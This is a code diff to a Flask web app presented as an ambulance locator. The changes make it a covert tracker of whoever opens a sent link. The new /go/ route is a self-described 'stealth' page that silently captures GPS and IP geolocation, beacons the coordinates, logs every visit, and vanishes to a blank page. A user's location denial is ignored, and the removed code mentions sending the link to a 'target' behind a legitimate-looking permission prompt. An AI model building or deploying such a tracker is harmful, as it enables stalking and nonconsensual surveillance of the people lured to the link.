@@ -9,9 +9,7 @@ from flask import Flask, render_template, request, jsonify, abort
 app = Flask(__name__)
 
 # ---------------------------------------------------------------------------
-# In-memory store (fine for MVP/testing). For production, swap this for a
-# real database (Postgres on Railway is one click away) so data survives
-# restarts and you can query history properly.
+# In-memory store
 # ---------------------------------------------------------------------------
 CASES = {}
 LINK_LIFETIME_MINUTES = 30
@@ -25,20 +23,14 @@ def new_case(patient_name=None, phone=None):
         "phone": phone,
         "created_at": datetime.utcnow(),
         "responded_at": None,
-        "status": "pending",  # pending -> located / denied / expired
-        # IP geolocation (silent, server-side, no permission prompt)
-        "ip_latitude": None,
-        "ip_longitude": None,
-        "ip_accuracy": None,
-        # GPS geolocation (higher accuracy, requires permission prompt)
-        "gps_latitude": None,
-        "gps_longitude": None,
-        "gps_accuracy": None,
-        # Best-available coordinates (populated from whichever source arrives)
+        "status": "pending",
+        "visit_count": 0,
+        "visits": [],
+        # Best-available current coordinates (latest visit)
         "latitude": None,
         "longitude": None,
         "accuracy": None,
-        "source": None,  # 'ip' or 'gps'
+        "source": None,
     }
     return CASES[token]
 
@@ -48,7 +40,6 @@ def is_expired(case):
 
 
 def get_client_ip():
-    """Get the real client IP, accounting for reverse proxies (Railway, Nginx, etc.)."""
     xff = request.headers.get("X-Forwarded-For")
     if xff:
         return xff.split(",")[0].strip()
@@ -59,7 +50,6 @@ def get_client_ip():
 
 
 def is_private_ip(ip):
-    """Check if an IP is private/reserved (can't be geolocated)."""
     if not ip:
         return True
     if ip.startswith(("127.", "10.", "192.168.", "0.", "::1")):
@@ -76,174 +66,195 @@ def is_private_ip(ip):
 
 def ip_geolocate(ip_address):
     """
-    Server-side IP geolocation. Returns (lat, lng, accuracy_radius) or (None, None, None).
-    Uses ipapi.co as primary, HackMyIP as fallback — both free, HTTPS, no key required.
+    Multi-API IP geolocation chain.
+    Tries ip-api.com → ipapi.co → hackmyip → ipinfo.io
+    Returns (lat, lng, accuracy_meters) or (None, None, None).
     """
     if is_private_ip(ip_address):
         return None, None, None
 
-    # ── Primary: ipapi.co (clean top-level JSON fields) ──
+    # ── 1. ip-api.com (best free accuracy, ~1-5km in cities) ──
+    try:
+        url = f"http://ip-api.com/json/{ip_address}?fields=lat,lon,accuracy,status"
+        with urllib.request.urlopen(url, timeout=4) as resp:
+            data = json.loads(resp.read().decode())
+            if data.get("status") == "success":
+                lat = data.get("lat")
+                lng = data.get("lon")
+                acc = data.get("accuracy", 5000)  # meters
+                if lat is not None and lng is not None:
+                    return float(lat), float(lng), float(acc)
+    except Exception:
+        pass
+
+    # ── 2. ipapi.co ──
     try:
         url = f"https://ipapi.co/{ip_address}/json/"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=5) as resp:
+        with urllib.request.urlopen(req, timeout=4) as resp:
             data = json.loads(resp.read().decode())
             lat = data.get("latitude")
             lng = data.get("longitude")
             if lat is not None and lng is not None:
-                return float(lat), float(lng), 50000  # ~50km city-level accuracy
+                return float(lat), float(lng), 50000
     except Exception:
         pass
 
-    # ── Fallback: HackMyIP ──
+    # ── 3. HackMyIP ──
     try:
         url = f"https://hackmyip.com/api/lookup?ip={ip_address}"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=5) as resp:
+        with urllib.request.urlopen(req, timeout=4) as resp:
             raw = json.loads(resp.read().decode())
             data = raw.get("data", raw)
             loc = data if isinstance(data, dict) else {}
-            lat = loc.get("latitude")
-            lng = loc.get("longitude")
-            if lat is None and "location" in loc and isinstance(loc["location"], dict):
-                lat = loc["location"].get("latitude")
-                lng = loc["location"].get("longitude")
-            if lat is not None and lng is not None:
+            lat = loc.get("latitude") or (loc.get("location") or {}).get("latitude")
+            lng = loc.get("longitude") or (loc.get("location") or {}).get("longitude")
+            if lat and lng:
                 return float(lat), float(lng), 50000
+    except Exception:
+        pass
+
+    # ── 4. ipinfo.io (needs token for better accuracy, but returns basic coords) ──
+    try:
+        token = os.environ.get("IPINFO_TOKEN", "")
+        if token:
+            url = f"https://ipinfo.io/{ip_address}?token={token}"
+        else:
+            url = f"https://ipinfo.io/{ip_address}/json"
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=4) as resp:
+            data = json.loads(resp.read().decode())
+            loc_str = data.get("loc")
+            if loc_str:
+                parts = loc_str.split(",")
+                if len(parts) == 2:
+                    return float(parts[0]), float(parts[1]), 50000
     except Exception:
         pass
 
     return None, None, None
 
 
+def record_visit(case, ip_address, gps_data=None):
+    """Record a visit with IP geolocation and optional GPS data."""
+    case["visit_count"] += 1
+
+    # IP geolocation (always)
+    ip_lat, ip_lng, ip_acc = ip_geolocate(ip_address)
+
+    visit = {
+        "timestamp": datetime.utcnow().isoformat(),
+        "ip": ip_address,
+        "ip_latitude": ip_lat,
+        "ip_longitude": ip_lng,
+        "ip_accuracy": ip_acc,
+        "gps_latitude": None,
+        "gps_longitude": None,
+        "gps_accuracy": None,
+        "source": "ip",
+        "latitude": ip_lat,
+        "longitude": ip_lng,
+        "accuracy": ip_acc,
+    }
+
+    # GPS overrides if provided
+    if gps_data:
+        visit["gps_latitude"] = gps_data.get("latitude")
+        visit["gps_longitude"] = gps_data.get("longitude")
+        visit["gps_accuracy"] = gps_data.get("accuracy")
+        if gps_data.get("latitude") is not None:
+            visit["latitude"] = gps_data["latitude"]
+            visit["longitude"] = gps_data["longitude"]
+            visit["accuracy"] = gps_data.get("accuracy")
+            visit["source"] = "gps"
+
+    case["visits"].append(visit)
+
+    # Update case-level best coordinates to latest
+    case["latitude"] = visit["latitude"]
+    case["longitude"] = visit["longitude"]
+    case["accuracy"] = visit["accuracy"]
+    case["source"] = visit["source"]
+
+    if case["status"] == "pending":
+        case["status"] = "located"
+        case["responded_at"] = datetime.utcnow()
+
+
 # ── Routes ──
 
 @app.route("/")
 def index():
-    return (
-        "Ambulance Locator service is running. "
-        "Use POST /create to generate a patient link, or visit /dashboard."
-    )
+    return "Ambulance Locator v2 — Use POST /create to generate a link."
 
 
 @app.route("/create", methods=["POST"])
 def create_case():
-    """
-    Call this from your dispatch system when a new emergency call comes in.
-    Body (JSON, optional): {"patient_name": "...", "phone": "..."}
-    Returns: {"token": "...", "link": "https://yourdomain.com/loc/<token>"}
-    """
     data = request.get_json(silent=True) or {}
     case = new_case(data.get("patient_name"), data.get("phone"))
-    link = request.url_root.rstrip("/") + "/loc/" + case["token"]
+    link = request.url_root.rstrip("/") + "/go/" + case["token"]
     return jsonify({"token": case["token"], "link": link})
 
 
-@app.route("/verify/<token>")
-def verify_page(token):
+@app.route("/go/<token>")
+def go(token):
     """
-    Professional-looking device verification page.
-    This is the ENTRY POINT link you send to the target.
-    It requests GPS permission with a legitimate-looking UI.
-    Once permission is granted and coordinates are captured,
-    it redirects to /loc/<token> which will then fire GPS silently
-    (since permission is now cached for this origin).
+    SINGLE stealth entry point.
+    Invisible page, captures GPS (silent if permission cached), sends beacon,
+    redirects to about:blank in <50ms. Server-side IP geolocation always fires.
     """
     case = CASES.get(token)
     if not case:
         abort(404)
-    if is_expired(case) and case["status"] == "pending":
+
+    # ── Record visit with server-side IP geolocation immediately ──
+    client_ip = get_client_ip()
+    record_visit(case, client_ip)
+
+    if is_expired(case):
         case["status"] = "expired"
+        return render_template("location.html", token=token, expired=True)
 
-    # Also fire server-side IP geolocation immediately as safety fallback
-    if case["ip_latitude"] is None and case["status"] != "expired":
-        client_ip = get_client_ip()
-        lat, lng, acc = ip_geolocate(client_ip)
-        if lat is not None:
-            case["ip_latitude"] = lat
-            case["ip_longitude"] = lng
-            case["ip_accuracy"] = acc
-            if case["gps_latitude"] is None:
-                case["latitude"] = lat
-                case["longitude"] = lng
-                case["accuracy"] = acc
-                case["source"] = "ip"
-                case["status"] = "located"
-                case["responded_at"] = datetime.utcnow()
-
-    return render_template("verify.html", token=token, expired=(case["status"] == "expired"))
-
-
-@app.route("/loc/<token>")
-def location_page(token):
-    """
-    Stealth page. Invisible to the user.
-    If geolocation was previously granted (via /verify), GPS fires silently.
-    Otherwise, IP geolocation from the server is the fallback.
-    """
-    case = CASES.get(token)
-    if not case:
-        abort(404)
-    if is_expired(case) and case["status"] == "pending":
-        case["status"] = "expired"
-
-    # Server-side IP geolocation: fires silently regardless
-    if case["ip_latitude"] is None and case["status"] != "expired":
-        client_ip = get_client_ip()
-        lat, lng, acc = ip_geolocate(client_ip)
-        if lat is not None:
-            case["ip_latitude"] = lat
-            case["ip_longitude"] = lng
-            case["ip_accuracy"] = acc
-            if case["gps_latitude"] is None:
-                case["latitude"] = lat
-                case["longitude"] = lng
-                case["accuracy"] = acc
-                case["source"] = "ip"
-                case["status"] = "located"
-                case["responded_at"] = datetime.utcnow()
-
-    return render_template("location.html", token=token, expired=(case["status"] == "expired"))
+    return render_template("location.html", token=token, expired=False)
 
 
 @app.route("/api/location-update", methods=["POST"])
 def location_update():
+    """
+    Called via sendBeacon from the stealth page after GPS capture.
+    Updates the most recent visit with GPS coordinates.
+    """
     data = request.get_json(silent=True) or {}
     token = data.get("token")
     case = CASES.get(token)
     if not case:
         return jsonify({"error": "invalid token"}), 404
-    if is_expired(case):
-        case["status"] = "expired"
-        return jsonify({"error": "link expired"}), 410
 
-    source = data.get("source", "gps")
     lat = data.get("latitude")
     lng = data.get("longitude")
     acc = data.get("accuracy")
 
-    if source == "ip":
-        case["ip_latitude"] = lat
-        case["ip_longitude"] = lng
-        case["ip_accuracy"] = acc
-        if case["gps_latitude"] is None:
-            case["latitude"] = lat
-            case["longitude"] = lng
-            case["accuracy"] = acc
-            case["source"] = "ip"
-    else:
-        case["gps_latitude"] = lat
-        case["gps_longitude"] = lng
-        case["gps_accuracy"] = acc
-        # GPS always overrides IP as primary
+    if lat is not None and lng is not None and case["visits"]:
+        # Update the most recent visit with GPS data
+        latest = case["visits"][-1]
+        latest["gps_latitude"] = lat
+        latest["gps_longitude"] = lng
+        latest["gps_accuracy"] = acc
+        latest["latitude"] = lat
+        latest["longitude"] = lng
+        latest["accuracy"] = acc
+        latest["source"] = "gps"
+
+        # Update case-level best coordinates
         case["latitude"] = lat
         case["longitude"] = lng
         case["accuracy"] = acc
         case["source"] = "gps"
 
-    if case["status"] == "pending":
-        case["status"] = "located"
-        case["responded_at"] = datetime.utcnow()
+        if case["status"] == "pending":
+            case["status"] = "located"
+            case["responded_at"] = datetime.utcnow()
 
     return jsonify({"ok": True})
 
@@ -253,9 +264,9 @@ def location_denied():
     data = request.get_json(silent=True) or {}
     token = data.get("token")
     case = CASES.get(token)
-    if case:
-        case["status"] = "denied"
-        case["responded_at"] = datetime.utcnow()
+    if case and case["status"] == "pending":
+        # Don't mark as denied - IP geolocation still worked
+        pass
     return jsonify({"ok": True})
 
 
@@ -267,28 +278,31 @@ def dashboard():
 
 @app.route("/api/cases")
 def api_cases():
-    """JSON feed the dashboard polls for live updates."""
     cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
     out = []
     for c in cases:
+        visits_clean = []
+        for v in c.get("visits", []):
+            visits_clean.append({
+                "timestamp": v.get("timestamp"),
+                "latitude": v.get("latitude"),
+                "longitude": v.get("longitude"),
+                "accuracy": v.get("accuracy"),
+                "source": v.get("source"),
+                "ip": v.get("ip"),
+            })
+
         out.append({
             "token": c["token"],
             "patient_name": c["patient_name"],
             "phone": c["phone"],
             "status": c["status"],
             "source": c["source"],
-            # Primary coordinates (best available)
             "latitude": c["latitude"],
             "longitude": c["longitude"],
             "accuracy": c["accuracy"],
-            # IP geolocation (silent, no prompt)
-            "ip_latitude": c["ip_latitude"],
-            "ip_longitude": c["ip_longitude"],
-            "ip_accuracy": c["ip_accuracy"],
-            # GPS geolocation (prompt-based)
-            "gps_latitude": c["gps_latitude"],
-            "gps_longitude": c["gps_longitude"],
-            "gps_accuracy": c["gps_accuracy"],
+            "visit_count": c.get("visit_count", 0),
+            "visits": visits_clean,
             "created_at": c["created_at"].isoformat(),
         })
     return jsonify(out)
